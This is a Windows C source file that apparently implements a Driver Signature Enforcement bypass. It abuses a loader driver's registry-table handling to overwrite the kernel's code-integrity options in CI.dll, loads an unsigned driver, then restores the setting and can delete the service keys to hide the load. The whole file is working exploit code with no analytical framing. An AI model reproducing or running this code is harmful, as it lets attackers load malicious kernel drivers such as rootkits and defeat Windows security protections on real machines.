#include <windows.h>
#include <winternl.h>
#include <shlwapi.h>
#include <stdio.h>

#define STATUS_INFO_LENGTH_MISMATCH 0xc0000004
#define SystemModuleInformation 0xb
#define SystemCodeIntegrityInformation 0x67

#define EQUALS(a,b) (RtlCompareMemory(a,b,sizeof(b)-1)==(sizeof(b)-1))
#define NT_MACHINE L"\\Registry\\Machine\\"
#define SVC_BASE NT_MACHINE L"System\\CurrentControlSet\\Services\\"

typedef struct {
	HANDLE Section;
	PVOID MappedBase;
	PVOID ImageBase;
	ULONG ImageSize;
	ULONG Flags;
	USHORT LoadOrderIndex;
	USHORT InitOrderIndex;
	USHORT LoadCount;
	USHORT OffsetToFileName;
	UCHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION;

typedef struct {
	ULONG NumberOfModules;
	RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES;

typedef struct {
	PVOID QueryRoutine;
	ULONG Flags;
	PCWSTR Name;
	PVOID EntryContext;
	ULONG DefaultType;
	PVOID DefaultData;
	ULONG DefaultLength;
} RTL_QUERY_REGISTRY_TABLE;

NTSTATUS NTAPI NtLoadDriver(PUNICODE_STRING);
NTSTATUS NTAPI NtUnloadDriver(PUNICODE_STRING);
NTSTATUS NTAPI RtlCreateRegistryKey(ULONG,PWSTR);
NTSTATUS NTAPI RtlWriteRegistryValue(ULONG,PCWSTR,PCWSTR,ULONG,PVOID,ULONG);
NTSTATUS NTAPI NtOpenKey(PHANDLE,ACCESS_MASK,POBJECT_ATTRIBUTES);
NTSTATUS NTAPI NtDeleteKey(HANDLE);
NTSTATUS NTAPI RtlAdjustPrivilege(ULONG,BOOLEAN,BOOLEAN,PBOOLEAN);

static void *addr_ci_orig;
static void *addr_ci_opt;
static void *addr_key;
static WCHAR dbuf[MAX_PATH];
static WCHAR lbuf[MAX_PATH];


static ULONG_PTR get_mod_base(char *name)
{
	int i;
	RTL_PROCESS_MODULES *m;
	DWORD got = 0;

	NTSTATUS ret = NtQuerySystemInformation(
		SystemModuleInformation, NULL, 0, &got);
	if (ret != STATUS_INFO_LENGTH_MISMATCH)
		return 0;

	m = malloc(got);
	if (!NT_SUCCESS(NtQuerySystemInformation(SystemModuleInformation, m, got, &got))) {
		free(m);
		return 0;
	}

	for (i = 0; i < m->NumberOfModules; i++) {
		RTL_PROCESS_MODULE_INFORMATION *p = m->Modules + i;
		if (!stricmp(name, (char*)p->FullPathName + p->OffsetToFileName)) {
			ULONG_PTR ret = (ULONG_PTR)p->ImageBase;
			free(m);
			return ret;
		}
	}
	free(m);
	return 0;
}

static ULONG_PTR ci_analyze()
{
	MEMORY_BASIC_INFORMATION info;
	HINSTANCE ci;
	ULONG_PTR base = get_mod_base("CI.DLL");
	WCHAR path[MAX_PATH];
	ULONG_PTR mod, ci_opt=0,key=0;
	BYTE *p;
	int i;

	wcscpy(path + GetSystemDirectoryW(path, MAX_PATH), L"\\CI.DLL");
	ci = LoadLibraryExW(path, NULL, DONT_RESOLVE_DLL_REFERENCES);
	if (!ci) goto meh;

	p = (void*)GetProcAddress(ci, "CiInitialize");
	mod = (ULONG_PTR)ci;

	// find jmp CipInitialize
	for (i = 0; i < 100; i++, p++) {
		// jmp/call forwardnearby
		if (((p[-1] & 0xfe) == 0xe8) && ((!(p[2] | p[3])) || ((p[2] & p[3]) == 0xff))) {
			BYTE *t = p + 4 + *((DWORD*)p);
			// Don't eat the security cookie
			// mov rax, [rip+something]
			if (EQUALS(t, "\x48\x8b\x05"))
				continue;
			goto cipinit_found;
		}
	}
	goto meh;
cipinit_found:
	p = p + 4 + *((DWORD*)p);
	for (i = 0; i < 100; i++, p++) {
		// mov ci_Options, ecx; check the relip points back and close
		if (p[-2] == 0x89 && p[-1] == 0x0d && p[3] == 0xff) {
			ci_opt = (ULONG_PTR)(p + 4) + *((LONG*)p);
			goto found_ci;
		}
	}
	goto meh;
found_ci:
	// Scratch space we use to stash original ci_Options into
	if (!VirtualQuery((void*)ci_opt, &info, sizeof(info)))
		goto meh;
	addr_ci_orig = (void*)(((ULONG_PTR)info.BaseAddress + info.RegionSize - 4) - mod + base);
	// Some dummy, unknown key
	p = (void*)(mod + 4096);
	// key address must incorporate RTL_QUERY_REGISTRY_DIRECT !
	while (*((UINT32*)p)>0xff || (!(((ULONG_PTR)p) & 0x20))) p++;
	addr_key = (void*)((ULONG_PTR)p - mod + base);
	addr_ci_opt = (void*)(ci_opt - mod + base);
	if (ci) FreeLibrary(ci);
	return 1;
meh:
	if (ci) FreeLibrary(ci);
	SetLastError(ERROR_NOT_SUPPORTED);
	return 0;
}

static int nt_path(WCHAR *dst, const WCHAR *src)
{
	wcscpy(dst, L"\\??\\");
	wcscat(dst, src);
	return wcslen(dst)*2+2;
}

static void fname2svc(WCHAR *svc, const WCHAR *name)
{
	const WCHAR *i;
	int p = sizeof(SVC_BASE)/2-1;
	wcscpy(svc, SVC_BASE);
	for (i = name; *i; i++)
		if (*i == L'\\')
			name = i+1;
	while (*name && *name != '.')
		svc[p++] = *name++;
	svc[p] = 0;
}

static int create_service(WCHAR *svc, const WCHAR *fname)
{
	WCHAR tmp[MAX_PATH];
	NTSTATUS st;
	DWORD dw = 1;

	fname2svc(svc, fname);
	st = RtlCreateRegistryKey(0, svc);
	if (!NT_SUCCESS(st))
		return st;
	RtlWriteRegistryValue(0, svc, L"ImagePath", REG_SZ, tmp, nt_path(tmp, fname));
	RtlWriteRegistryValue(0,svc, L"Type", REG_DWORD, &dw, sizeof(dw));
	return 0;
}

static void clear_service(const WCHAR *svc)
{
	SHDeleteKeyW(HKEY_LOCAL_MACHINE, svc + sizeof(NT_MACHINE)/2-1);
}

static BOOL dse_status()
{
	DWORD infoci[2] = { sizeof(infoci) };
	DWORD dw = sizeof(infoci);
	NTSTATUS ret = NtQuerySystemInformation(SystemCodeIntegrityInformation, &infoci, sizeof(infoci), &dw);
	return (infoci[1] & 3) == 1;
}

static NTSTATUS do_loaddriver(const WCHAR *n)
{
	UNICODE_STRING su;
	RtlInitUnicodeString(&su, n);
	return NtLoadDriver(&su);
}
static NTSTATUS do_unloaddriver(const WCHAR *n)
{
	UNICODE_STRING su;
	RtlInitUnicodeString(&su, n);
	return NtUnloadDriver(&su);
}


// Copy 1 byte from -> to -> backup
static NTSTATUS trigger_exploit(WCHAR *svc, int method, void *from, void *to, void *backup)
{

	struct {
		UINT64 pad;
		RTL_QUERY_REGISTRY_TABLE tab[4];
	} buf;

	RTL_QUERY_REGISTRY_TABLE *t;
	//sizeof(RTL_QUERY_REGISTRY_TABLE);

	// VC++ is phenomenally stupid, so this has to be a bit long winded
	memset(&buf, 0, sizeof(buf));
	t = &buf.tab[2];
	t->Flags = 32;
	t->Name = addr_key;
	t->EntryContext = backup;
	t->DefaultType = REG_DWORD;
	t->DefaultData = to;
	t->DefaultLength = 1;

	t = &buf.tab[3];
	t->Flags = 32;
	t->Name = addr_key;
	t->EntryContext = to;
	t->DefaultType = REG_DWORD;
	t->DefaultData = from;
	t->DefaultLength = 1;

	printf("0x%llx 0x%llx\n",to,from);

	RtlWriteRegistryValue(0, svc, L"FlowControlDisable", REG_SZ, L"x", 4);
	method *= 4;
	RtlWriteRegistryValue(0, svc, L"FlowControlDisplayBandwidth", REG_BINARY,
			(void*)(((BYTE*)buf.tab)+method), sizeof(buf.tab)-method);

	do_unloaddriver(svc);
	return do_loaddriver(svc);
}

static NTSTATUS nt_ok(NTSTATUS st)
{
	SetLastError(RtlNtStatusToDosError(st));
	return NT_SUCCESS(st);
}

BOOL LoadDriver(const WCHAR *_loader, const WCHAR *_driver, int hidden)
{
	WCHAR loader[MAX_PATH];
	WCHAR driver[MAX_PATH];
	BOOLEAN old;

	if (!ci_analyze())
		return 0;

	if (!nt_ok(RtlAdjustPrivilege(10, 1, 0, &old)))
		return 0;

	if (!GetFullPathNameW(_loader, MAX_PATH, loader, NULL))
		return 0;
	if (!GetFullPathNameW(_driver, MAX_PATH, driver, NULL))
		return 0;

	if (!nt_ok(create_service(dbuf, driver)))
		return 0;
	/*if (!dse_status()) {
		return nt_ok(do_loaddriver(dbuf));
	}*/
	if (!nt_ok(create_service(lbuf, loader)))
		return 0;
	trigger_exploit(lbuf, -1, (BYTE*)addr_key + 2, addr_ci_opt, addr_ci_orig);
	if (dse_status()) {
		trigger_exploit(lbuf, 1, (BYTE*)addr_key + 2, addr_ci_opt, addr_ci_orig);
		if (dse_status()) {
			SetLastError(ERROR_NOT_SUPPORTED);
			return 0;
		}
	}
	NTSTATUS sav = do_loaddriver(dbuf);

	trigger_exploit(lbuf, -1, addr_ci_orig, addr_ci_opt, (BYTE*)addr_ci_orig-4);
	if (!dse_status())
		trigger_exploit(lbuf, 1, addr_ci_orig, addr_ci_opt, (BYTE*)addr_ci_orig-4);
	//trigger_exploit(lbuf, 1, addr_ci_orig, addr_ci_opt, (BYTE*)addr_ci_orig - 4);//
	do_unloaddriver(lbuf);
	clear_service(lbuf);
	if ((!NT_SUCCESS(sav)) || (hidden))
		clear_service(dbuf);
	nt_ok(sav);
	return 1;
}

BOOL UnloadDriver(const WCHAR *path, int hidden)
{
	NTSTATUS st;
	BOOLEAN old;

	if (!nt_ok(RtlAdjustPrivilege(10, 1, 0, &old)))
		return 0;

	if (path && hidden)
		create_service(dbuf, path);
	fname2svc(dbuf, path);
	st = do_unloaddriver(dbuf);
	if (hidden)
		clear_service(dbuf);
	if (nt_ok(st)) {
		clear_service(dbuf);
		return 1;
	}
	return 0;
}


